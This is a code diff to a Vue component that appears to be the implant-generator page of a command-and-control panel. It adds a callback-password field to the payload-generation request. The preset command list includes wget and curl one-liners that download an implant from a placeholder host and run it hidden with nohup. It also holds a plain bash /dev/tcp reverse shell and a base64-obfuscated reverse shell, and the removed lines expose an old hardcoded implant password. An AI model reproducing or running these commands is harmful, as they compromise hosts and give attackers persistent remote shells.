@@ -23,6 +23,9 @@
             <el-option v-for="arch in archOptions" :key="arch" :label="arch" :value="arch" />
           </el-select>
         </el-form-item>
+        <el-form-item label="上线密码">
+          <el-input v-model="formData.pass" style="width: 220px;"  placeholder="输入上线密码"></el-input>
+        </el-form-item>
       </el-form>
 
       <!-- 生成按钮 -->
@@ -81,7 +84,8 @@ const archMapping: Record<string, string[]> = {
 const formData = reactive({
   listener:'',
   os: '',
-  arch: ''
+  arch: '',
+  pass:''
 });
 
 // 架构选项
@@ -97,7 +101,7 @@ const handleOSChange = (os: string) => {
 const handleGenerate = async () => {
   let res = ''
   try {
-    const res = await ClientAPI.GenServer({osType:formData.os,archType:formData.arch,listener:formData.listener})
+    const res = await ClientAPI.GenServer({osType:formData.os,archType:formData.arch,listener:formData.listener,pass:formData.pass})
     if (res.status == 200) {
       ElMessage.success('导出成功')
       const contentDisposition = res.headers['content-disposition'] || ''
@@ -154,9 +158,9 @@ const handleGenerate = async () => {
   }
 };
 const commands = reactive([
-  { name: "上线命令", code: "./r_linux_amd64 tNROopcR45q4Z8I1" },
-  { name: "linux wget上线", code: "wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 tNROopcR45q4Z8I1 > m.log 2>&1 &" },
-  { name: "linux curl上线", code: "curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 tNROopcR45q4Z8I1 > m.log 2>&1 &" },
+  { name: "上线命令", code: "./r_linux_amd64 [上线密码]" },
+  { name: "linux wget上线", code: "wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &" },
+  { name: "linux curl上线", code: "curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &" },
   { name: "反弹shell", code: "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1" },
   { name: "反弹shell2", code: "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}" },
 ]);
